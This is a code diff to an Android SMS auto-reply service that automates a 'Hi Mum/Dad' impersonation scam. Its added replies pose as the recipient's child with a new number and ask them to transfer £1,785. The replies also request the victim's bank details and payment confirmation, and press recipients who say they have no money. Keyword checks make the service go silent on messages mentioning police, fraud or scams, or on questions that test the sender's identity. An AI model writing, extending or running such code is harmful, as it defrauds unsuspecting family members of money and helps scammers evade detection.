@@ -14,6 +14,7 @@ import android.os.Looper
 import android.os.PowerManager
 import android.util.Log
 import okhttp3.MediaType.Companion.toMediaType
+import java.util.Locale
 
 class SmsProcessingService : Service() {
     companion object {
@@ -357,8 +358,6 @@ class SmsProcessingService : Service() {
                 } catch (e: Exception) {
                     Log.e(TAG, "Error releasing wake lock: ${e.message}", e)
                 }
-                
-                // REMOVED: Full scan feature - only process new incoming messages
             }
         }.start()
     }
@@ -516,15 +515,293 @@ class SmsProcessingService : Service() {
             Log.d(TAG, "Payment paragraph question - queued macbook response")
             return
         }
+
+        // Old number / delete old number questions
+        val oldNumberKeywords = listOf(
+            "old number",
+            "previous number",
+            "old mobile",
+            "old phone",
+            "old sim",
+            "your old"
+        )
+        val asksAboutOldNumber = oldNumberKeywords.any { lowerBody.contains(it) } ||
+                (lowerBody.contains("delete") && lowerBody.contains("old") && (lowerBody.contains("number") || lowerBody.contains("num")))
+        if (asksAboutOldNumber) {
+            val response = "Yes ill be using this number from now on, you can delete the old one."
+            val incomingMessageHash = hashMessage(sender, body)
+            AutoSendQueue.enqueue(this, sender, response, AutoSendQueue.Source.AI, incomingMessageHash)
+            Log.d(TAG, "Fallback: Old number question - queued response: $response")
+            return
+        }
         
+        fun selectNameFromOrQuestion(text: String): String? {
+            val lower = text.lowercase()
+            if (
+                !lower.contains("is this") &&
+                !lower.contains("is it") &&
+                !lower.contains("is that") &&
+                !lower.contains("are you")
+            ) return null
+            val regex = Regex("([A-Za-z][A-Za-z]+)\\s+or\\s+([A-Za-z][A-Za-z]+)")
+            val match = regex.find(text)
+            val femaleNames = setOf(
+                "amy", "anna", "beth", "charlotte", "chloe", "danielle", "emily", "emma",
+                "georgia", "grace", "hannah", "isla", "jessica", "karen", "kate", "katie",
+                "lauren", "lily", "lucy", "megan", "nicole", "olivia", "rachel", "sarah",
+                "sophie", "victoria", "zoe"
+            )
+            if (match != null) {
+                fun prettyName(raw: String): String {
+                    val cleaned = raw.trim().trimEnd('.', ',', '!', '?')
+                    return if (cleaned.isNotEmpty()) {
+                        cleaned.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
+                    } else cleaned
+                }
+                val first = prettyName(match.groupValues[1])
+                val second = prettyName(match.groupValues[2])
+                val options = listOf(first, second).filter { it.isNotEmpty() }
+                if (options.size == 2) {
+                    val feminine = options.firstOrNull { femaleNames.contains(it.lowercase()) }
+                    return feminine ?: options.first()
+                }
+            }
+            return null
+        }
+        
+        fun detectSingleWordName(original: String): String? {
+            val cleaned = original.replace(Regex("[^A-Za-z]"), " ").trim()
+            val words = cleaned.split(Regex("\\s+")).filter { it.isNotEmpty() }
+            if (words.size == 1) {
+                val word = words[0]
+                if (word.length >= 2 && word[0].isLetter()) {
+                    return word.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
+                }
+            }
+            return null
+        }
+        
+        fun containsPoliceKeywords(lower: String): Boolean {
+            val keywords = listOf("police", "fraud squad", "cyber crime", "cybercrime", "scam unit", "authorities", "law enforcement")
+            return keywords.any { lower.contains(it) }
+        }
+        
+        fun isWhichChildMessage(lower: String): Boolean {
+            return lower.contains("which child is this") ||
+                   (lower.contains("which child") && lower.contains("number")) ||
+                   lower.contains("which kid is this") ||
+                   lower.contains("child of mine") ||
+                   lower.contains("children's number") ||
+                   lower.contains("childrens number")
+        }
+        
+        fun needsHelpDecline(lower: String): Boolean {
+            return (lower.contains("need any help") || lower.contains("need help with it") || lower.contains("help with it") ||
+                    lower.contains("need help with anything") || lower.contains("want any help")) &&
+                    (lower.contains("kit") || lower.contains("device") || lower.contains("phone") || lower.contains("number") || lower.contains("new"))
+        }
+        
+        fun isReactionToSaveNumber(lower: String): Boolean {
+            return (lower.contains("liked") || lower.contains("reacted") || lower.contains("loved") || lower.contains("thumbs up")) &&
+                   lower.contains("dad save my new number")
+        }
+        
+        fun isMissedCallAlert(lower: String): Boolean {
+            return lower.contains("missed a call from me") &&
+                   (lower.contains("call alert") || lower.contains("dial 901") || lower.contains("o2"))
+        }
+        
+        fun mentionsNoChildren(lower: String): Boolean {
+            return lower.contains("no sons") ||
+                   lower.contains("no daughters") ||
+                   lower.contains("no children") ||
+                   lower.contains("no kids") ||
+                   lower.contains("not anyone's dad") ||
+                   lower.contains("no one's dad")
+        }
+        
+        fun mentionsScam(lower: String): Boolean {
+            return lower.contains("goodbye scam") ||
+                   (lower.contains("scam") && (lower.contains("goodbye") || lower.contains("bye") || lower.contains("lol")))
+        }
+        
+        fun paymentRefusal(lower: String): Boolean {
+            return lower.contains("lol no") || lower.contains("nah no") || lower.contains("no chance") || lower.contains("not paying")
+        }
+        
+        fun wrongNumberDad(lower: String): Boolean {
+            return lower.contains("wrong number pal") ||
+                   lower.contains("wrong number mate") ||
+                   lower.contains("wrong number") && lower.contains("dad")
+        }
+        
+        fun asksBankDetailsButLow(lower: String): Boolean {
+            return (lower.contains("what are your bank details") || lower.contains("bank details") || lower.contains("account details")) &&
+                   (lower.contains("dont have that much") || lower.contains("don't have that much") || lower.contains("not that much") || lower.contains("don't have much"))
+        }
+        
+        fun acknowledgesSaveAnythingElse(lower: String): Boolean {
+            return (lower.contains("i'll save it") || lower.contains("ill save it") || lower.contains("saved it")) &&
+                   (lower.contains("anything else you need") || lower.contains("anything else you need") || lower.contains("need anything else"))
+        }
+        
+        fun acknowledgesNoWorries(lower: String): Boolean {
+            return lower.contains("ok no worries") ||
+                   lower.contains("okay no worries") ||
+                   lower.contains("no worries") ||
+                   lower.contains("ok thats fine") ||
+                   lower.contains("okay thats fine") ||
+                   lower.contains("all good") ||
+                   lower.contains("fine no problem")
+        }
+        
+        fun paymentConfirmed(lower: String): Boolean {
+            return (lower.contains("payment sent") || lower.contains("money sent") || lower.contains("paid") || lower.contains("transfer done") || lower.contains("sent it")) &&
+                   (lower.contains("payment") || lower.contains("transfer") || lower.contains("bank") || lower.contains("money"))
+        }
+        
+        fun noMoneyAvailable(lower: String): Boolean {
+            return lower.contains("don't have any money") ||
+                   lower.contains("dont have any money") ||
+                   lower.contains("have £") && lower.contains("left") ||
+                   lower.contains("have no money") ||
+                   lower.contains("only have") && lower.contains("£")
+        }
+        
+        fun asksYourName(lower: String): Boolean {
+            return lower.contains("your name") && lower.contains("?")
+        }
+
+        fun isQuestionMarksOnly(text: String): Boolean {
+            val trimmed = text.trim()
+            return trimmed.isNotEmpty() && trimmed.all { it == '?' }
+        }
+
+        fun mentionsRefusalToSave(lower: String): Boolean {
+            return lower.contains("i don't want to") && lower.contains("save")
+        }
+
+        fun asksWhichTwin(lower: String): Boolean {
+            return lower.contains("which twin are you") || lower.contains("which twin")
+        }
+
+        fun asksNeedMoneyAgain(lower: String): Boolean {
+            return lower.contains("need money again")
+        }
+
+        fun asksHowDoIKnow(lower: String): Boolean {
+            return lower.contains("how do i know") && lower.contains("really you")
+        }
+
+        fun asksHowOldNow(lower: String): Boolean {
+            return lower.contains("how old are you now") || (lower.contains("how old are you") && lower.contains("now"))
+        }
+
+        fun asksWhatsMyNameThen(lower: String): Boolean {
+            return lower.contains("what's my name then") || lower.contains("whats my name then") || lower.contains("what is my name then")
+        }
+
+        fun mentionsStrangeParentScenario(lower: String): Boolean {
+            return (lower.contains("spare undies") || (lower.contains("mum") && lower.contains("says hi"))) && lower.contains("son")
+        }
+
+        fun asksPickUp(lower: String): Boolean {
+            return (lower.contains("pick me up") || lower.contains("pick us up")) && lower.contains("after work")
+        }
+
+        fun asksWhereHaveYouBeen(lower: String): Boolean {
+            return lower.contains("where have you been") || lower.contains("where've you been")
+        }
+
+        fun asksFoodToday(lower: String): Boolean {
+            return lower.contains("what have you had to eat") || lower.contains("what did you eat today") || lower.contains("what've you eaten")
+        }
+
+        fun asksCarProblemAfterFavour(lower: String): Boolean {
+            return (lower.contains("car problem") || lower.contains("car problems") || lower.contains("car issue") || lower.contains("car again")) ||
+                    lower.contains("what's wrong") || lower.contains("whats wrong") || lower.contains("what happened")
+        }
+        
+        fun pickFavourMessage(): String {
+            val variants = listOf(
+                "Could you do me a favour please?",
+                "Do you think you could do me a small favour?",
+                "Could you do me a quick favour when you get a sec?",
+                "Any chance you could do me a little favour?"
+            )
+            val idx = (System.currentTimeMillis() / 1000L % variants.size).toInt()
+            return variants[idx]
+        }
+        
+        shouldUseFallback = false // Defer special-case handling to backend
+
         if (shouldUseFallback) {
+            val nameChoice = selectNameFromOrQuestion(body)
+            val singleName = detectSingleWordName(body)
+            val lowerBodyContainsPolice = containsPoliceKeywords(lowerBody)
+            if (lowerBodyContainsPolice) {
+                Log.d(TAG, "Detected police-related message - not responding")
+                return
+            }
+            if (mentionsNoChildren(lowerBody) ||
+                mentionsScam(lowerBody) ||
+                paymentRefusal(lowerBody) ||
+                wrongNumberDad(lowerBody) ||
+                isQuestionMarksOnly(body) ||
+                mentionsRefusalToSave(lowerBody) ||
+                asksWhichTwin(lowerBody) ||
+                asksNeedMoneyAgain(lowerBody) ||
+                asksHowDoIKnow(lowerBody) ||
+                asksHowOldNow(lowerBody) ||
+                asksWhatsMyNameThen(lowerBody) ||
+                mentionsStrangeParentScenario(lowerBody)) {
+                Log.d(TAG, "Detected message to ignore based on safety rules")
+                return
+            }
             val fallbackResponse = when {
+                isWhichChildMessage(lowerBody) ->
+                    "it is your eldest and favourite, i will be using this number from now on. Everything's all good though, how are you getting on?"
+                asksYourName(lowerBody) ->
+                    "Your eldest and favourite"
+                isReactionToSaveNumber(lowerBody) ->
+                    pickFavourMessage()
+                acknowledgesSaveAnythingElse(lowerBody) ->
+                    pickFavourMessage()
+                acknowledgesNoWorries(lowerBody) ->
+                    pickFavourMessage()
+                asksPickUp(lowerBody) ->
+                    "I'm not sure yet, I might be tied up. If anything changes I'll let you know."
+                asksWhereHaveYouBeen(lowerBody) ->
+                    "Sorry, I've just been busy lately."
+                asksFoodToday(lowerBody) ->
+                    "I just grabbed a quick sandwich earlier, nothing too exciting. What about you?"
+                asksCarProblemAfterFavour(lowerBody) ->
+                    "No it's not, I need to make a payment today but can't for 24h until my new number is added to my online banking. Would you be able to make the transfer on my behalf if I send you the details and I'll pay you back tomorrow please? Total is £1,785 if that's okay?"
+                singleName != null ->
+                    "Yes ill be using this number from now on"
                 (lowerBody.contains("promise") || lowerBody.contains("will pay") || lowerBody.contains("pay back") || 
                  lowerBody.contains("pay you back") || lowerBody.contains("pay me back")) && 
                 (lowerBody.contains("tomorrow") || lowerBody.contains("will") || lowerBody.contains("promise")) -> 
                     "Yes i will i promise"
                 lowerBody.contains("pay back") || lowerBody.contains("pay you back") || lowerBody.contains("pay me back") -> 
                     "Yes i will i promise"
+                nameChoice != null ->
+                    "Its $nameChoice"
+                lowerBody.contains("everything ok") || lowerBody.contains("everything okay") ||
+                lowerBody.contains("everything alright") || lowerBody.contains("everything all right") ||
+                lowerBody.contains("everything good") || lowerBody.contains("all ok") ||
+                lowerBody.contains("all okay") || lowerBody.contains("all right") ->
+                    "Yeah everything's okay, how about you?"
+                asksBankDetailsButLow(lowerBody) ->
+                    "Payment details are okay, would you be able to help with half of the payment?"
+                paymentConfirmed(lowerBody) ->
+                    "Thank you so much honestly, could you please send over your bank details so I can pay you back first thing in the morning and also if possible can you please send over a confirmation of the payment so I can send it over."
+                noMoneyAvailable(lowerBody) ->
+                    "Is there anyone you can ask? It's urgent, I really don't want to get hit with late fees and I promise I'll get it back to you first thing in the morning."
+                isMissedCallAlert(lowerBody) ->
+                    "I can't call right now, could you drop me a message instead?"
+                needsHelpDecline(lowerBody) ->
+                    "Thanks, I'm all sorted with it now but really appreciate you offering."
                 lowerBody.contains("crashed") || lowerBody.contains("crash") || lowerBody.contains("accident") -> {
                     if (lowerBody.contains("car")) {
                         "Oh no, is everyone okay? Let me know if you need anything"
@@ -553,10 +830,6 @@ class SmsProcessingService : Service() {
                  lowerBody.contains("pick up") || lowerBody.contains("grab")) && 
                 (lowerBody.contains("and") || lowerBody.split(" ").size >= 3) -> 
                     "Yes please"
-                (lowerBody.contains("whatsapp") || lowerBody.contains("whats app")) && 
-                (lowerBody.contains("set") || lowerBody.contains("setup") || lowerBody.contains("set up") || 
-                 lowerBody.contains("ready") || lowerBody.contains("done") || lowerBody.contains("working")) -> 
-                    "Not yet i still need to set it up"
                 lowerBody.contains("what you been up to") || lowerBody.contains("what you been") || 
                 (lowerBody.contains("okay") && lowerBody.contains("what")) -> 
                     "Hey, not much just been busy. How about you?"
